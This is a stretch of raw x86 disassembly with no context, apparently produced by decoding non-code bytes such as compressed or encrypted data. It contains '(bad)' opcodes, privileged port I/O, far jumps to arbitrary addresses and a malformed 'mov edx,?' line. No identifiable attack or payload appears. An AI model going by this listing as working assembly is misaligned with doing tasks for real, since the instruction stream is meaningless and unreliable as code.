  427c06:	bound  ebx,QWORD PTR ds:0xfd1f240b
  427c0c:	outs   dx,BYTE PTR ds:[esi]
  427c0d:	cmp    ecx,DWORD PTR [edi]
  427c0f:	jbe    0x427bc5
  427c11:	mov    esi,0x2be2d319
  427c16:	dec    edi
  427c17:	mov    edx,?
  427c19:	ds dec edi
  427c1b:	mov    ecx,0xe8ced7d2
  427c20:	push   esp
  427c21:	lods   eax,DWORD PTR ds:[esi]
  427c22:	cmp    BYTE PTR [ecx+eiz*8-0x7bf35d46],0xb1
  427c2a:	mov    dh,0xef
  427c2c:	shl    DWORD PTR [ebx-0x12],0xb1
  427c30:	jecxz  0x427bc2
  427c32:	ins    DWORD PTR es:[edi],dx
  427c33:	fcmovu st,st(1)
  427c35:	rcr    al,0x20
  427c38:	xor    DWORD PTR [esi],eax
  427c3a:	sahf   
  427c3b:	mov    BYTE PTR [esi-0x73],dl
  427c3e:	and    ebx,DWORD PTR [esi]
  427c40:	in     eax,0x59
  427c42:	cwde   
  427c43:	and    bl,ah
  427c45:	lea    edi,[edx-0x33]
  427c48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c49:	mov    ebx,0x9b236dd3
  427c4e:	out    dx,al
  427c4f:	int3   
  427c50:	leave  
  427c51:	push   edi
  427c52:	jne    0x427c55
  427c54:	pusha  
  427c55:	stos   DWORD PTR es:[edi],eax
  427c56:	fcomp  DWORD PTR [ecx+0x77]
  427c59:	loop   0x427c15
  427c5b:	ret    
  427c5c:	pop    ss
  427c5d:	xor    DWORD PTR [esi-0x5f643952],ecx
  427c63:	xor    al,0xdd
  427c65:	push   esi
  427c66:	sub    dl,BYTE PTR [esi-0x4d9b2afe]
  427c6c:	and    bh,BYTE PTR [eax-0x322df9eb]
  427c72:	or     DWORD PTR ds:0x59d77a27,edx
  427c78:	ss pop ebp
  427c7a:	adc    eax,0x7207b09
  427c7f:	sbb    esp,ebx
  427c81:	xchg   ebp,eax
  427c82:	xor    DWORD PTR [eax-0x6237e8e],edi
  427c88:	xchg   esi,eax
  427c89:	add    al,0xbd
  427c8b:	test   DWORD PTR [edx-0x1e92e5c0],edx
  427c91:	das    
  427c92:	shl    cl,1
  427c94:	and    dh,BYTE PTR [esi+esi*1+0x52354bfb]
  427c9b:	fwait
  427c9c:	or     eax,DWORD PTR ds:[esi-0x3]
  427ca0:	or     ecx,DWORD PTR [edi]
  427ca2:	fcomp  st(5)
  427ca4:	repnz arpl ax,ax
  427ca7:	bound  ebp,QWORD PTR [ecx-0x24]
  427caa:	das    
  427cab:	nop
  427cac:	out    dx,eax
  427cad:	xor    ebx,ebp
  427caf:	cli    
  427cb0:	mov    ebx,DWORD PTR [edx]
  427cb2:	jmp    0x98b7b4a4
  427cb7:	pop    edi
  427cb8:	xacquire xchg BYTE PTR [ebx+0xd],cl
  427cbc:	xor    BYTE PTR [edx-0x142b1f75],dl
  427cc2:	pop    ds
  427cc3:	fcomp  QWORD PTR [esi+0x7c505b71]
  427cc9:	dec    edx
  427cca:	test   al,0x5e
  427ccc:	nop
  427ccd:	int    0x5f
  427ccf:	retf   
  427cd0:	repz pop esp
  427cd2:	xchg   esp,eax
  427cd3:	xchg   ecx,eax
  427cd4:	icebp  
  427cd5:	out    0xaf,al
  427cd7:	test   ebp,ebx
  427cd9:	dec    edx
  427cda:	sub    dl,BYTE PTR [eax+0x2f]
  427cdd:	jnp    0x427d1e
  427cdf:	lock das 
  427ce1:	push   eax
  427ce2:	gs cli 
  427ce4:	into   
  427ce5:	shl    BYTE PTR [esi+0x13a7752],cl
  427ceb:	fwait
  427cec:	sub    esp,esi
  427cee:	mov    dh,0x0
	...
  427cf8:	add    BYTE PTR [eax],al
  427cfa:	sbb    esp,DWORD PTR [edi]
  427cfc:	pushf  
  427cfd:	cli    
  427cfe:	mov    esp,0xaae77ffb
  427d03:	xchg   esp,eax
  427d04:	out    dx,eax
  427d05:	cdq    
  427d06:	xchg   ch,ch
  427d08:	or     DWORD PTR [esi+0x1f260],eax
  427d0e:	std    
  427d0f:	add    DWORD PTR [eax],eax
  427d11:	add    BYTE PTR [edi+0x56633049],bl
  427d17:	pop    esi
  427d18:	dec    edi
  427d19:	std    
  427d1a:	mov    dl,0x8f
  427d1c:	adc    dh,al
  427d1e:	lea    eax,[edx-0x49]
  427d21:	(bad)  
  427d22:	call   0x6c9a2379
  427d27:	jo     0x427d84
  427d29:	loop   0x427cc0
  427d2b:	(bad)  
  427d2c:	sbb    al,0xe6
  427d2e:	in     al,dx
  427d2f:	inc    esi
  427d30:	mov    esp,0xbe6328f9
  427d35:	out    dx,al
  427d36:	mov    dl,0xc5
  427d38:	inc    ebp
  427d39:	cdq    
  427d3a:	push   ebx
  427d3b:	add    eax,0xfd8e87ed
  427d40:	enter  0xe54f,0xe3
  427d44:	sub    al,0x16
  427d46:	shr    DWORD PTR [ebx-0x33],1
  427d49:	push   ecx
  427d4a:	and    DWORD PTR [edx+0x7db16fa2],esp
  427d50:	or     DWORD PTR [eax],edi
  427d52:	imul   edi,edi,0x34232201
  427d58:	fistp  QWORD PTR [ebp-0x4c]
  427d5b:	psubb  mm0,mm0
  427d5e:	das    
  427d5f:	pop    eax
  427d60:	pop    eax
  427d61:	pop    edx
  427d62:	je     0x427d26
  427d64:	clc    
  427d65:	(bad)  
  427d66:	pop    ds
  427d67:	jl     0x427d20
  427d69:	cwde   
  427d6a:	mov    edi,0x18ef8aa9
  427d6f:	jecxz  0x427cf2
  427d71:	adc    al,0xe
  427d73:	xchg   esp,eax
  427d74:	sbb    DWORD PTR [ecx+0x1ac2cc79],edx
  427d7a:	xchg   esp,eax
  427d7b:	fs loop 0x427d2c
  427d7e:	push   esp
  427d7f:	inc    edi
  427d80:	dec    edi
  427d81:	in     eax,dx
  427d82:	pop    ecx
  427d83:	addr16 adc eax,0x77bc0cba
  427d89:	clc    
  427d8a:	adc    bh,BYTE PTR [esi+0xa773f06]
  427d90:	jno    0x427df9
  427d92:	push   0xffffffbe
  427d94:	dec    ebx
  427d95:	mov    edi,0x43163917
  427d9a:	push   edx
  427d9b:	je     0x427dec
  427d9d:	fdivr  QWORD PTR [ebp+0x18]
  427da0:	jl     0x427d3c
  427da2:	jnp    0x427d73
  427da4:	and    esi,DWORD PTR [ecx-0x70]
  427da7:	aas    
  427da8:	cmc    
  427da9:	lods   eax,DWORD PTR ds:[esi]
  427daa:	aam    0x7f
  427dac:	cmp    al,al
  427dae:	jae    0x427e1b
  427db0:	scas   eax,DWORD PTR es:[edi]
  427db1:	shr    DWORD PTR [eax+0x14],cl
  427db4:	mov    ah,0xa9
  427db6:	sbb    esp,DWORD PTR [ebx-0x1f]
  427db9:	cmp    eax,0xdd42c75b
  427dbe:	(bad)  
  427dbf:	arpl   WORD PTR [ecx],bx
  427dc1:	pop    esp
  427dc2:	(bad)  
  427dc3:	dec    esp
  427dc4:	mov    bl,0xfd
  427dc6:	push   ds
  427dc7:	imul   esi,DWORD PTR [ebp-0x69],0x61e55893
  427dce:	add    DWORD PTR [edi+0x7cfb65e8],ebp
  427dd4:	fild   WORD PTR [esp+edi*1+0x3bdb04bf]
  427ddb:	adc    esi,DWORD PTR [ebx-0x3bf2f46f]
  427de1:	jmp    0x427dbf
  427de3:	daa    
  427de4:	pusha  
  427de5:	jmp    0x87e03e5
  427dea:	std    
  427deb:	(bad)  
  427dec:	stc    
  427ded:	ror    DWORD PTR [edx],cl
  427def:	cmp    edx,esi
  427df1:	sub    dl,al
  427df3:	loopne 0x427e11
  427df5:	mov    ds:0xae13a634,eax
  427dfa:	sub    edx,DWORD PTR [ecx-0x6d05b8c3]
  427e00:	dec    esp
  427e01:	mov    eax,ds:0x5fdb091d
  427e06:	pusha  
  427e07:	in     al,0x69
  427e09:	mov    al,0xaf
  427e0b:	dec    ebp
  427e0c:	push   0x73f85d10
  427e11:	jg     0x427e17
  427e13:	clc    
  427e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e15:	imul   esp,DWORD PTR [edx-0x6406e320],0xbb2688e4
  427e1f:	cmp    BYTE PTR [ebp+0x3c],al
  427e22:	cli    
  427e23:	(bad)  
  427e25:	push   eax
  427e26:	cli    
  427e27:	or     DWORD PTR [ebp+0x3c],eax
  427e2a:	loopne 0x427e3d
  427e2c:	add    BYTE PTR [ebx+ebx*1-0x5d],dl
  427e30:	mov    ds:0x16cf5299,eax
  427e35:	mov    ah,0x54
  427e37:	push   edx
  427e38:	scas   eax,DWORD PTR es:[edi]
  427e39:	test   DWORD PTR [edi-0x23],ebx
  427e3c:	scas   al,BYTE PTR es:[edi]
  427e3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e3e:	xchg   ebp,eax
  427e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e40:	sub    ch,BYTE PTR [edi+0x42]
  427e43:	fcomp  DWORD PTR [esi-0x158a8d5f]
  427e49:	xor    al,0xf8
  427e4b:	pop    ecx
  427e4c:	xor    cl,BYTE PTR [esi+0x12434bb]
  427e52:	out    dx,al
  427e53:	icebp  
  427e54:	sbb    esi,edi
  427e56:	cs out dx,eax
  427e58:	pop    esp
  427e59:	adc    eax,0xfba85a5f
  427e5e:	fwait
  427e5f:	push   ds
  427e60:	jle    0x427e2e
  427e62:	inc    edi
  427e63:	in     al,dx
  427e64:	push   0x53
  427e66:	inc    esi
  427e67:	dec    eax
  427e68:	fdiv   QWORD PTR [ebx+0x35c6415e]
  427e6e:	jo     0x427e88
  427e70:	aad    0x1f
  427e72:	lock repnz loopne 0x427e43
  427e76:	aam    0xc5
  427e78:	test   BYTE PTR [ebx],bl
  427e7a:	dec    edi
  427e7b:	mov    al,ds:0x9438fe9b
  427e80:	add    ebx,ebx
  427e82:	pop    eax
  427e83:	adc    DWORD PTR [edx+0x12],ebp
  427e86:	aad    0xae
  427e88:	cmp    DWORD PTR ds:[edx-0x26],0x44b56a33
  427e90:	push   cs
  427e91:	pop    ss
  427e92:	cmp    DWORD PTR [edi],edi
  427e94:	xor    ebx,ecx
  427e96:	inc    eax
  427e97:	jne    0x427e77
  427e99:	or     al,0x15
  427e9b:	cmc    
  427e9c:	retf   
  427e9d:	daa    
  427e9e:	bound  eax,QWORD PTR [esi]
  427ea0:	inc    esp
  427ea1:	in     eax,dx
  427ea2:	lock xchg edx,eax
  427ea4:	mov    dl,0xf8
  427ea6:	inc    DWORD PTR [ebp-0x4e]
  427ea9:	(bad)  
  427eaa:	push   ecx
  427eab:	outs   dx,BYTE PTR ds:[esi]
  427eac:	loop   0x427f15
  427eae:	loope  0x427ed8
  427eb0:	mov    DWORD PTR [bp+di+0x41],edx
  427eb4:	shr    DWORD PTR [ebx],cl
  427eb6:	or     al,0x13
  427eb8:	stc    
  427eb9:	sub    eax,0x303e9ffa
  427ebe:	nop
  427ebf:	or     BYTE PTR [ebx],ch
  427ec1:	mov    ds:0x8ccbf949,eax
  427ec6:	or     esi,ebp
  427ec8:	call   0xec601136
  427ecd:	mov    ebx,0x5432ebdf
  427ed2:	pop    ebx
  427ed3:	mov    al,0x57
  427ed5:	mov    eax,0xda1acf88
  427eda:	xchg   ecx,eax
  427edb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427edc:	mov    cl,0x58
  427ede:	push   ds
  427edf:	sub    ebp,DWORD PTR [ecx+0x6ceec87]
  427ee5:	stos   DWORD PTR es:[edi],eax
  427ee6:	xchg   ebp,eax
  427ee7:	cmp    edi,edi
  427ee9:	mov    sp,si
  427eec:	xchg   DWORD PTR [edi+0x5a],esi
  427eef:	and    ch,bh
  427ef1:	mov    edi,0x25ee2cd2
  427ef6:	dec    esp
  427ef7:	lds    esi,FWORD PTR [edx]
  427ef9:	mov    esi,0xaad9fa0a
  427efe:	into   
  427eff:	jle    0x427f0f
  427f01:	add    DWORD PTR [ebp+0x317bb388],esi
  427f07:	push   ebx
  427f08:	jnp    0x427e97
  427f0a:	pop    edx
  427f0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f0c:	jge    0x427f8a
  427f0e:	adc    eax,0x0
  427f13:	add    BYTE PTR [eax],al
  427f15:	add    BYTE PTR [eax],al
  427f17:	add    BYTE PTR [eax],al
  427f19:	add    BYTE PTR [edx-0x107ddbc],bl
  427f1f:	(bad)  
  427f20:	fisub  DWORD PTR [esi-0x37]
  427f23:	and    dh,BYTE PTR [ecx+edx*1-0x13]
  427f27:	mov    edx,0xf45d700f
  427f2c:	add    DWORD PTR [eax],eax
  427f2e:	std    
  427f2f:	add    DWORD PTR [eax],eax
  427f31:	add    BYTE PTR [edi+0x28],bh
  427f34:	xchg   edx,eax
  427f35:	ret    0x5ee8
  427f38:	mov    cl,dl
  427f3a:	ss jmp 0x561d4a6b
  427f40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f41:	mov    edx,0x350206ae
  427f46:	in     eax,dx
  427f47:	daa    
  427f48:	(bad)  
  427f49:	mov    ch,ch
  427f4b:	call   0x182c262a
  427f50:	loope  0x427f93
  427f52:	xor    eax,0x87cf17cf
  427f57:	jle    0x427fb1
  427f59:	adc    DWORD PTR [esi-0x8048c35],edx
  427f5f:	nop
  427f60:	daa    
  427f61:	mov    al,0xb
  427f63:	mov    ebp,ecx
  427f65:	out    0xcf,al
  427f67:	div    edx
  427f69:	inc    ebx
  427f6a:	or     eax,0x3e98a586
  427f6f:	mov    esp,0xd1f4a692
  427f74:	push   ebx
  427f75:	jmp    FWORD PTR [esi+0x540851b6]
  427f7b:	mov    ds:0x82d7f2f7,eax
  427f80:	jmp    DWORD PTR [eax]
  427f82:	aad    0xd4
  427f84:	int3   
  427f85:	pop    eax
  427f86:	fstp   DWORD PTR [ebp-0x4a]
  427f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f8a:	fstp   QWORD PTR ds:0xfc1cca56
  427f90:	and    ecx,0xffffffaf
  427f93:	cwde   
  427f94:	xor    ebp,DWORD PTR [edi+0x39aaf55b]
  427f9a:	push   ecx
  427f9b:	cmp    ebp,edx
  427f9d:	push   0x50c47082
  427fa2:	xchg   ebp,eax
  427fa3:	push   ds
  427fa4:	jmp    0xe667683b
  427fa9:	push   ecx
  427faa:	lahf   
  427fab:	fisub  WORD PTR [esi]
  427fad:	adc    al,0x2f
  427faf:	sbb    BYTE PTR [edx],bl
  427fb1:	imul   eax,esi,0x1857b485
  427fb7:	icebp  
  427fb8:	into   
  427fb9:	xchg   ecx,eax
  427fba:	in     eax,dx
  427fbb:	xchg   dh,bh
  427fbd:	xchg   edx,eax
  427fbe:	lock mov eax,0x5507e789
  427fc4:	jmp    0xeb82:0xbdb06363
  427fcb:	sub    edi,DWORD PTR [ecx+eiz*4]
  427fce:	fmulp  st(0),st
  427fd0:	scas   eax,DWORD PTR es:[edi]
  427fd1:	scas   eax,DWORD PTR es:[edi]
  427fd2:	mov    al,0x3
  427fd4:	arpl   WORD PTR [eax],si
  427fd6:	sti    
  427fd7:	fisttp QWORD PTR [edx-0x7a]
  427fda:	adc    al,0x1c
  427fdc:	pop    ecx
  427fdd:	ds inc edi
  427fdf:	jns    0x427f67
  427fe1:	jg     0x427f7b
  427fe3:	imul   edx,DWORD PTR [ebx],0x5e
  427fe6:	fld    QWORD PTR [edx+0x1632eff4]
  427fec:	int    0x4d
  427fee:	push   ss
  427fef:	xchg   ecx,eax
  427ff0:	into   
  427ff1:	inc    esi
  427ff2:	rol    ecx,0x2
  427ff5:	pop    eax
  427ff6:	xchg   ebp,eax
  427ff7:	pop    ds
  427ff8:	push   edi
  427ff9:	outs   dx,BYTE PTR ds:[esi]
  427ffa:	scas   al,BYTE PTR es:[edi]
  427ffb:	pop    esp
  427ffc:	jmp    0x427fb3
  427ffe:	out    0x40,al
  428000:	je     0x428001
  428002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428004:	or     ebp,DWORD PTR [ebx-0x29]
  428007:	and    dl,dh
  428009:	ins    DWORD PTR es:[edi],dx
  42800a:	fidiv  DWORD PTR [eax+0x2b]
  42800d:	jae    0x42805d
  42800f:	ja     0x427fbb
  428011:	(bad)  
  428012:	or     dx,0xffe7
  428016:	cmp    ecx,edi
  428018:	mov    dl,0x9
  42801a:	inc    ebp
  42801b:	mov    esi,0xff270445
  428020:	jb     0x42806c
  428022:	loop   0x428074
  428024:	pop    edi
  428025:	mov    BYTE PTR [edx],al
  428027:	sahf   
  428028:	mov    ebx,DWORD PTR [eax-0x5733b68f]
  42802e:	push   0x3b
  428030:	lods   al,BYTE PTR ds:[esi]
  428031:	cmp    al,BYTE PTR [esi-0x3dfaf874]
  428037:	pop    es
  428038:	nop
  428039:	rcl    bl,cl
  42803b:	or     eax,DWORD PTR [ebx-0x6a]
  42803e:	mov    edx,DWORD PTR [ebx+0x47]
  428041:	sti    
  428042:	sti    
  428043:	jmp    0x6bdc:0x7ad5aec0
  42804a:	jle    0x42803d
  42804c:	lock push edx
  42804e:	sub    eax,0x62e22e5e
  428053:	jne    0x428098
  428055:	or     eax,0x4a6300fa
  42805a:	xchg   ecx,eax
  42805c:	mov    al,ds:0x5e0ee9cf
  428061:	pop    esp
  428062:	jne    0x428037
  428064:	xor    BYTE PTR [edx+0x706500e],bh
  42806a:	dec    edi
  42806b:	mov    BYTE PTR [edi],al
  42806d:	xchg   edx,eax
  42806e:	std    
  42806f:	sbb    edx,DWORD PTR [ebx-0x1c]
  428072:	and    al,BYTE PTR [edx-0x205f727f]
  428078:	jge    0x4280e1
  42807a:	ja     0x4280bc
  42807c:	jl     0x4280cd
  42807e:	mov    al,0x52
  428080:	xchg   ebp,eax
  428081:	out    0xc5,eax
  428083:	push   esi
  428084:	ret    0xd667
  428087:	jp     0x4280a5
  428089:	popf   
  42808a:	ret    0x6bf0
  42808d:	dec    ecx
  42808e:	imul   esi,ebp,0x8ce0ee30
  428094:	mov    bl,0x42
  428096:	retf   0x69c2
  428099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42809a:	pop    esp
  42809b:	jns    0x42807f
  42809d:	imul   esp,ebp,0xf06acac0
  4280a3:	mov    dh,0xe7
  4280a5:	and    al,0x32
  4280a7:	add    eax,0x4321a7c3
  4280ac:	pop    esp
  4280ad:	sub    DWORD PTR [edi-0x545d745c],edi
  4280b3:	ja     0x4280d8
  4280b5:	inc    esp
  4280b6:	std    
  4280b7:	cld    
  4280b8:	cmp    bl,bl
  4280ba:	jmp    0x42812a
  4280bc:	enter  0x577,0x15
  4280c0:	leave  
  4280c1:	rol    cl,1
  4280c3:	mov    ah,0xf9
  4280c5:	and    bl,bh
  4280c7:	pop    ecx
  4280c8:	mov    ebx,DWORD PTR [eax]
  4280ca:	mov    ah,0x12
  4280cc:	ret    
  4280cd:	sahf   
  4280ce:	mov    eax,ds:0x9060654
  4280d3:	cwde   
  4280d4:	fdivr  QWORD PTR [edi+0x5c9e4015]
  4280da:	inc    esp
  4280db:	mov    eax,ds:0x53f7e61
  4280e0:	cmc    
  4280e1:	popa   
  4280e2:	add    al,BYTE PTR [edx-0x4c]
  4280e5:	inc    ebp
  4280e6:	lahf   
  4280e7:	push   es
  4280e8:	retf   0xc0
  4280eb:	mov    edi,0xe05bf9ce
  4280f0:	jb     0x428144
  4280f2:	jbe    0x4280bd
  4280f4:	mov    eax,0x5e85d0
  4280f9:	(bad)  
  4280fb:	push   cs
  4280fc:	ret    0x3180
  4280ff:	xor    DWORD PTR [ebx],edi
  428101:	fs push 0xffffffdf
  428104:	mov    ebx,0x39d242f5
  428109:	sar    BYTE PTR [esi-0x63b299d3],cl
  42810f:	add    ebx,DWORD PTR ds:0xb15c9771
  428115:	in     eax,0x5f
  428117:	(bad)  
  428118:	aaa    
  428119:	sbb    al,0x14
  42811b:	or     eax,0x9a1b9bde
  428120:	sbb    BYTE PTR [esi+0x52],dh
  428123:	test   DWORD PTR [esp+ebx*2-0x1aa7781],eax
  42812a:	mov    WORD PTR [ebx+0xccc891],ds
	...
  428138:	add    BYTE PTR [eax],al
  42813a:	nop
  42813b:	stos   DWORD PTR es:[edi],eax
  42813c:	es ret 
  42813e:	aas    
  42813f:	iret   
  428140:	cmc    
  428141:	sti    
  428142:	pushf  
  428143:	and    al,0x28
  428145:	push   ebp
  428146:	mov    ds:0x5a0f9a8e,eax
  42814b:	test   BYTE PTR [ecx],0x0
  42814e:	std    
  42814f:	add    DWORD PTR [eax],eax
  428151:	add    BYTE PTR [ecx+esi*8+0x51386958],ah
  428158:	hlt    
  428159:	loope  0x4280e9
  42815b:	adc    BYTE PTR [ebx],bh
  42815d:	mov    esp,0x60acce6a
  428162:	sub    ebx,esp
  428164:	mov    ch,0x93
  428166:	aam    0xc7
  428168:	mov    ch,0x1e
  42816a:	inc    edi
  42816b:	mov    edx,0x30947656
  428170:	lods   eax,DWORD PTR ds:[esi]
  428171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428172:	push   0x12
  428174:	and    ah,BYTE PTR [edi+0x11]
  428177:	cmp    cl,0x58
  42817a:	sub    eax,0x9fb845e2
  42817f:	in     eax,0x6f
  428181:	stos   DWORD PTR es:[edi],eax
  428182:	mov    BYTE PTR [edx-0x29],ch
  428185:	js     0x4281b8
  428187:	mov    ds:0x43f3f00c,eax
  42818c:	test   al,0x13
  42818e:	jmp    0x2e3acd24
  428193:	hlt    
  428194:	xor    eax,0x9f59b8c7
  428199:	aas    
  42819a:	imul   ebx,DWORD PTR [edi-0x2f],0x84d1cf53
  4281a1:	jne    0x4281a2
  4281a3:	pop    ebp
  4281a4:	mov    ebp,0x9fa67d7
  4281a9:	fucomi st,st(1)
  4281ab:	sbb    ah,BYTE PTR [edx]
  4281ad:	jbe    0x42816b
  4281af:	ficomp WORD PTR [esi]
  4281b1:	inc    esp
  4281b2:	popf   
  4281b3:	imul   ecx,DWORD PTR [esi-0x74],0xc13360f
  4281ba:	rol    DWORD PTR [ebp-0xe9270ea],1
  4281c0:	push   edx
  4281c1:	sub    DWORD PTR [esi-0x6b],ecx
  4281c4:	adc    ebx,0xffffffcf
  4281c7:	dec    ecx
  4281c8:	in     eax,dx
  4281c9:	test   al,0xaf
  4281cb:	xchg   BYTE PTR [ebx],dl
  4281cd:	mov    esi,0x6eb8b0b4
  4281d2:	pusha  
  4281d3:	inc    ebx
  4281d4:	adc    BYTE PTR [ebp-0xcfc444f],ah
  4281da:	pop    edi
  4281db:	sbb    ebp,DWORD PTR [ecx+0x55235516]
  4281e1:	dec    esp
  4281e2:	loop   0x4281f8
  4281e4:	xchg   BYTE PTR [ecx+ecx*8+0x57eb4279],bh
  4281eb:	int    0x45
  4281ed:	jo     0x428262
  4281ef:	out    dx,eax
  4281f0:	dec    esp
  4281f1:	adc    ch,dl
  4281f3:	je     0x42818f
  4281f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281f6:	jnp    0x42821b
  4281f8:	not    cl
  4281fa:	pop    eax
  4281fb:	and    esp,DWORD PTR [edx+0xace0885]
  428201:	dec    ebx
  428202:	mov    bl,0xc9
  428204:	jnp    0x4281a3
  428206:	scas   al,BYTE PTR es:[edi]
  428207:	pushf  
  428208:	and    al,BYTE PTR [edi+0x65]
  42820b:	aam    0x70
  42820d:	outs   dx,BYTE PTR ds:[esi]
  42820e:	jae    0x4281a8
  428210:	loope  0x428211
  428212:	add    eax,0x4dfe0e14
  428217:	push   ebx
  428218:	aam    0xa5
  42821a:	lods   eax,DWORD PTR ds:[esi]
  42821b:	add    DWORD PTR [eax],ebx
  42821d:	cli    
  42821e:	aaa    
  42821f:	call   DWORD PTR [eax-0x42198e1d]
  428225:	pop    esi
  428226:	mov    dl,0xd0
  428228:	lea    edx,[eax-0x7e]
  42822b:	jne    0xad7aa8e6
  428231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428232:	iret   
  428233:	fisttp DWORD PTR [edi+eax*8+0x1b]
  428237:	sbb    DWORD PTR [ecx],esi
  428239:	jmp    0xa2332d7a
  42823e:	enter  0xd840,0x11
  428242:	mov    bh,0x2e
  428244:	arpl   WORD PTR [ecx-0x738351af],dx
  42824a:	scas   eax,DWORD PTR es:[edi]
  42824b:	icebp  
  42824c:	aaa    
  42824d:	dec    ecx
  42824e:	sar    DWORD PTR [ebx-0x53f50a7],0x25
  428255:	dec    esi
  428256:	push   esp
  428257:	xchg   ebp,eax
  428258:	xchg   ebp,eax
  428259:	mov    dh,0xab
  42825b:	jg     0x4282a6
  42825d:	iret   
  42825e:	mov    ch,0xfa
  428260:	push   edx
  428261:	rcl    BYTE PTR [ebx+edi*2+0x20],cl
  428265:	push   ebp
  428266:	sub    ah,al
  428268:	stc    
  428269:	outs   dx,BYTE PTR ds:[esi]
  42826a:	stos   BYTE PTR es:[edi],al
  42826b:	add    dl,dh
  42826d:	mov    bh,0x8
  42826f:	xor    BYTE PTR [eax-0x7f6d7e31],0xf3
  428276:	je     0x4282c6
  428278:	pop    ds
  428279:	sbb    ch,dl
  42827b:	sbb    eax,0xda9e9983
  428280:	loopne 0x42828c
  428282:	dec    ebx
  428283:	repnz sub DWORD PTR [ebp+0x12b97fc7],ecx
  42828a:	mov    ds:0x69cc05f0,eax
  42828f:	mov    DWORD PTR [eax+0x65],edx
  428292:	pop    eax
  428293:	jg     0x428265
  428295:	inc    esp
  428296:	in     eax,dx
  428297:	imul   esi,DWORD PTR [esi+0x1a],0x7
  42829b:	fidivr DWORD PTR [edi+esi*2]
  42829e:	mov    dl,0x4d
  4282a0:	sbb    BYTE PTR [ecx+0x2c],dl
  4282a3:	adc    ebp,ebx
  4282a5:	mov    edx,0x5e72a572
  4282aa:	icebp  
  4282ab:	sub    BYTE PTR [esi-0x4b2633c5],ah
  4282b1:	lea    eax,[ebp+0x2e]
  4282b4:	jbe    0x4282c4
  4282b6:	out    dx,eax
  4282b7:	mov    al,0x5b
  4282b9:	(bad)  
  4282bb:	xchg   edx,eax
  4282bc:	mov    ah,0x5f
  4282be:	ins    BYTE PTR es:[edi],dx
  4282bf:	ret    
  4282c0:	idiv   cl
  4282c2:	and    BYTE PTR ds:0xcc4583c1,0x53
  4282c9:	adc    DWORD PTR [ecx],edx
  4282cb:	pop    ebx
  4282cc:	test   DWORD PTR [ebx+eax*8],esp
  4282cf:	xor    edi,DWORD PTR [eax-0x52]
  4282d2:	or     al,0x89
  4282d4:	es dec ebx
  4282d6:	dec    esp
  4282d7:	xor    esp,DWORD PTR [ebp+0x294a2995]
  4282dd:	iret   
  4282de:	test   DWORD PTR [esi],ebp
  4282e0:	loop   0x4282e2
  4282e2:	(bad)  
  4282e3:	int    0x86
  4282e5:	push   ds
  4282e6:	cmp    al,0xad
  4282e8:	pop    ss
  4282e9:	push   esp
  4282ea:	jl     0x428359
  4282ec:	sub    BYTE PTR [ebx],dl
  4282ee:	sbb    bh,dh
  4282f0:	test   DWORD PTR [ebx-0x7e],0xfe1da69f
  4282f7:	mov    ah,0xaa
  4282f9:	dec    esp
  4282fa:	inc    ebp
  4282fb:	xchg   ebp,eax
  4282fc:	loopne 0x428355
  4282fe:	not    BYTE PTR [eax-0x57]
  428301:	std    
  428302:	dec    ecx
  428303:	fdiv   QWORD PTR [edi+0x5d]
  428306:	(bad)  
  428307:	jle    0x428331
  428309:	jmp    0x55fa:0x730fcc7f
  428310:	jae    0x4282a4
  428312:	inc    esp
  428313:	loop   0x428387
  428315:	rcr    DWORD PTR [edx],cl
  428317:	sbb    al,BYTE PTR [ecx+0xe]
  42831a:	stos   BYTE PTR es:[edi],al
  42831b:	clc    
  42831c:	in     al,0xac
  42831e:	in     al,dx
  42831f:	pusha  
  428320:	xlat   BYTE PTR ds:[ebx]
  428321:	js     0x428356
  428323:	pop    esp
  428324:	fst    DWORD PTR [edx-0x34]
  428327:	xchg   esi,eax
  428328:	push   eax
  428329:	cmp    eax,0x117c9515
  42832e:	push   0x45
  428330:	shl    BYTE PTR [edi],0x83
  428333:	add    ebx,ebx
  428335:	jb     0x428390
  428337:	xchg   BYTE PTR [ecx-0x57],dh
  42833a:	stos   DWORD PTR es:[edi],eax
  42833b:	sar    DWORD PTR [eax+0x848cd27],cl
  428341:	dec    ecx
  428342:	aam    0x35
  428344:	aad    0xc6
  428346:	lods   al,BYTE PTR ds:[esi]
  428347:	mov    ah,0xb8
  428349:	or     ebp,esp
  42834b:	pop    es
  42834c:	or     BYTE PTR [edi+0x11],dl
	...
  428357:	add    BYTE PTR [eax],al
  428359:	add    ch,bh
  42835b:	cmp    DWORD PTR ds:0xfd1cf514,esi
  428361:	stc    
  428362:	jl     0x428396
  428364:	stc    
  428365:	jne    0x4282ef
  428367:	jg     0x42834f
  428369:	xchg   edx,eax
  42836a:	push   edi
  42836b:	clc    
  42836c:	add    DWORD PTR [eax],eax
  42836e:	std    
  42836f:	add    DWORD PTR [eax],eax
  428371:	add    BYTE PTR [ecx-0x3d7bb040],bl
  428377:	mov    DWORD PTR [esi*4+0x2dee77b8],0x186ff686
  428382:	jmp    0x92ae:0xca7c9a51
  428389:	sar    bl,cl
  42838b:	sti    
  42838c:	mov    ecx,0x28673d1a
  428391:	gs loopne 0x428377
  428394:	test   esi,0xfd53f591
  42839a:	bound  ebx,QWORD PTR [eax-0x43]
  42839d:	dec    ecx
  42839f:	mov    dl,ah
  4283a1:	es cld 
  4283a3:	jae    0x428421
  4283a5:	push   ebp
  4283a6:	lock outs dx,DWORD PTR ds:[esi]
  4283a8:	dec    ebp
  4283a9:	pop    ds
  4283aa:	xchg   DWORD PTR [edx+0x5a750cb8],edx
  4283b0:	pop    esi
  4283b1:	ja     0x428402
  4283b3:	mov    esi,0x36be53f1
  4283b8:	adc    eax,0xc4c6ac96
  4283bd:	lea    esp,[ebp+0x7e559ca1]
